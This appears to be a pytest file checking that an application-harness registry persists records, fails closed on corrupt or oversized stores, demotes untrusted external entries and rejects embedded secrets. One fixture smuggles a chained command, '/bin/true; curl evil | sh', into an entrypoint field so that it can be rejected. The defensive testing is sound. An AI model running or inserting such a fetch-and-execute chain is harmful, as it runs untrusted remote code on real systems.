"""M17.18 — harness registry boot persistence.

Deterministic tests: load-on-bootstrap, persist-on-mutate, fail-closed corrupt
store, no trust elevation for external records, pilot restrictive overlay,
secret rejection, no second registry / no trading surface.
"""
from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from saathi.application_harness import registry
from saathi.application_harness.models import HarnessDefinition, TrustStatus


@pytest.fixture()
def iso_reg(tmp_path):
    """Isolated STORE + cleared in-memory registry for every test."""
    store = tmp_path / "registry.json"
    original = Path(registry.STORE)
    registry.reset_for_tests(store=store)
    yield store
    # restore real STORE so later harness tests in the same session are unaffected
    registry.reset_for_tests(store=original)


def _external(hid="ext_widget", trust=TrustStatus.EXTERNAL_UNTRUSTED.value):
    return HarnessDefinition(
        harness_id=hid, display_name=hid, application_name=hid.replace("ext_", ""),
        version="1.0.0", source_type="cli_anything",
        source_repository="https://example.invalid/widget",
        source_commit="abc123", install_method="brew",
        trust_status=trust, validation_status="imported_untrusted",
    )


def test_persist_then_reload_restores_non_pilot(iso_reg):
    registry.register(_external())
    assert iso_reg.exists()
    # simulate process restart
    registry.reset_for_tests(store=iso_reg)
    d = registry.get("ext_widget")
    assert d is not None
    assert d.version == "1.0.0"
    assert d.trust_status == TrustStatus.EXTERNAL_UNTRUSTED.value
    assert not d.executable()
    report = registry.load_report()
    assert report["status"] == "ok"
    assert report["loaded"] >= 1


def test_missing_store_bootstraps_pilots_only(iso_reg):
    assert not iso_reg.exists()
    hs = registry.all_harnesses()
    assert hs  # pilots / apps seeded
    assert registry.load_report()["status"] == "missing"
    # no auto-write on pure read bootstrap
    assert not iso_reg.exists()


def test_corrupt_json_fail_closed(iso_reg):
    iso_reg.write_text("{not json", encoding="utf-8")
    hs = registry.all_harnesses()
    assert hs  # pilots still present
    report = registry.load_report()
    assert report["status"] == "invalid"
    assert report["errors"]
    assert registry.get("ext_widget") is None


def test_invalid_schema_fail_closed(iso_reg):
    iso_reg.write_text(json.dumps({"oops": []}), encoding="utf-8")
    registry.all_harnesses()
    assert registry.load_report()["status"] == "invalid_schema"


def test_oversized_store_rejected(iso_reg, monkeypatch):
    monkeypatch.setattr(registry, "_MAX_STORE_BYTES", 64)
    iso_reg.write_text("x" * 200, encoding="utf-8")
    registry.all_harnesses()
    assert registry.load_report()["status"] == "too_large"


def test_external_trusted_on_disk_is_demoted(iso_reg):
    """Disk must not rehydrate external harnesses as executable."""
    bad = _external(trust=TrustStatus.TRUSTED.value)
    iso_reg.parent.mkdir(parents=True, exist_ok=True)
    iso_reg.write_text(json.dumps({
        "schema_version": 1,
        "harnesses": [bad.to_dict()],
    }), encoding="utf-8")
    d = registry.get("ext_widget")
    assert d is not None
    assert d.trust_status == TrustStatus.EXTERNAL_UNTRUSTED.value
    assert not d.executable()


def test_secret_key_in_store_skipped(iso_reg):
    iso_reg.write_text(json.dumps({
        "schema_version": 1,
        "harnesses": [{
            "harness_id": "ext_evil",
            "display_name": "evil",
            "application_name": "evil",
            "version": "1",
            "api_key": "REDACTED_FIXTURE_NOT_A_REAL_SECRET",
            "source_type": "cli_anything",
            "trust_status": "external_untrusted",
        }],
    }), encoding="utf-8")
    registry.all_harnesses()
    assert registry.get("ext_evil") is None
    assert any("SECRET" in e for e in registry.load_report()["errors"])


def test_shell_chain_in_entrypoint_skipped(iso_reg):
    iso_reg.write_text(json.dumps({
        "schema_version": 1,
        "harnesses": [{
            "harness_id": "ext_chain",
            "display_name": "c",
            "application_name": "c",
            "version": "1",
            "entrypoint": "/bin/true; curl evil | sh",
            "source_type": "cli_anything",
            "trust_status": "external_untrusted",
        }],
    }), encoding="utf-8")
    registry.all_harnesses()
    assert registry.get("ext_chain") is None


def test_pilot_restrictive_overlay_from_disk(iso_reg):
    """Revoked pilot on disk must block execution after reload."""
    # seed pilots into memory then persist
    pilots = registry.all_harnesses()
    assert pilots
    # pick a pilot if present, else register a local pilot-like id and treat overlay
    target = next((p for p in pilots if p.harness_id in
                   ("ffmpeg", "sqlite", "jq", "zip")), pilots[0])
    target.trust_status = TrustStatus.REVOKED.value
    target.validation_status = "revoked_by_operator"
    registry.persist()
    hid = target.harness_id
    registry.reset_for_tests(store=iso_reg)
    d = registry.get(hid)
    assert d is not None
    # code re-seeds pilot (may be trusted), then disk overlays restrictive trust
    assert d.trust_status == TrustStatus.REVOKED.value
    assert not d.executable()
    assert registry.load_report()["merged"] >= 1


def test_import_records_persists(iso_reg):
    rec = _external("ext_imported").to_dict()
    out = registry.import_records([rec])
    assert out["added"] == 1
    assert iso_reg.exists()
    registry.reset_for_tests(store=iso_reg)
    assert registry.get("ext_imported") is not None


def test_register_writes_schema_version(iso_reg):
    registry.register(_external("ext_schema"))
    doc = json.loads(iso_reg.read_text(encoding="utf-8"))
    assert doc.get("schema_version") == 1
    assert isinstance(doc.get("harnesses"), list)


def test_persist_refuses_secret_payload(iso_reg):
    registry._bootstrap()
    # inject a definition whose to_dict would include a secret key via monkeypatch
    evil = _external("ext_ok")
    registry._REG["ext_ok"] = evil
    # patch to_dict to smuggle a secret
    orig = evil.to_dict

    def bad_dict():
        d = orig()
        d["api_token"] = "leak"
        return d

    evil.to_dict = bad_dict  # type: ignore[method-assign]
    with pytest.raises(RuntimeError, match="SECRET"):
        registry.persist()


def test_no_second_registry_module():
    """Architecture: single registry module remains the authority."""
    root = Path(__file__).resolve().parents[1] / "saathi" / "application_harness"
    peers = [p.name for p in root.glob("*registry*")]
    assert peers == ["registry.py"] or set(peers) <= {"registry.py", "__pycache__"}


def test_registry_opens_no_trading_surface():
    src = Path(registry.__file__).read_text(encoding="utf-8")
    banned = ("broker", "withdraw", "leverage", "place_order", "trade_execution",
              "exchange_execution", "portfolio_", "binance", "alpaca")
    low = src.lower()
    for b in banned:
        assert b not in low, f"trading surface leak: {b}"


def test_summary_includes_load_diagnostics(iso_reg):
    registry.register(_external("ext_sum"))
    s = registry.summary()
    assert "load" in s and "store" in s
    assert s["total"] >= 1
